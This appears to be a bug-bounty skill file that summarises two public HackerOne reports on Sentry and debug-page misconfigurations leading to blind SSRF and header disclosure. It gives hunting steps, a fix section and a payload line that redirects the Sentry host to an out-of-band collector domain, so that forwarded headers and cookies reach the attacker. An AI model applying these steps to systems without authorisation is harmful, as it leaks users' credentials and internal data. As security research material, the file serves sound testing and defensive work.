---
name: info-sentry-debug
description: Sentry/debug-endpoint misconfiguration → blind SSRF / info disclosure. Teaches abusing error-tracking (Sentry) and debug/error pages that reflect headers and internals.
sources: hackerone_public
report_count: 1
---

# Sentry / Debug-Endpoint Misconfiguration → SSRF & Info Disclosure

**Reports**: HackerOne — "Blind SSRF on errors.hackerone.net due to Sentry misconfiguration" (#374737, $3,500); HackerOne — "404-response contains debug-information with all headers" (#792998).

## Why it matters (the new lesson)
Error-tracking (Sentry) and debug/error pages often echo request data (headers, cookies) or forward data to internal collectors. A misconfigured Sentry DSN / debug route can turn any request into a blind SSRF (the error payload is sent to an attacker-controlled URL) or leak internal headers/secrets to the response.

## How it works
1. Sentry: if the DSN/`project` can be influenced, errors are POSTed to your server (blind SSRF), carrying headers/cookies.
2. Debug 404 pages echo all headers (including `Authorization`/`Cookie`) back in the body.

## How to hunt for it
1. Trigger errors; watch for `X-Sentry`/`Sentry` headers and DSN params.
2. Try overriding the Sentry host/`project`/`sentry_key` to your Collaborator.
3. Hit non-existent paths and inspect 404/500 bodies for reflected headers.

## Payloads / flow
```
sentry_key=ATTACKER&sentry_host=canary.oastify.com
GET /nonexistent  → body echoes all request headers
```

## Fix
Harden Sentry (server-side DSN, no user-controllable host); strip internal headers from debug output; disable verbose errors in prod.
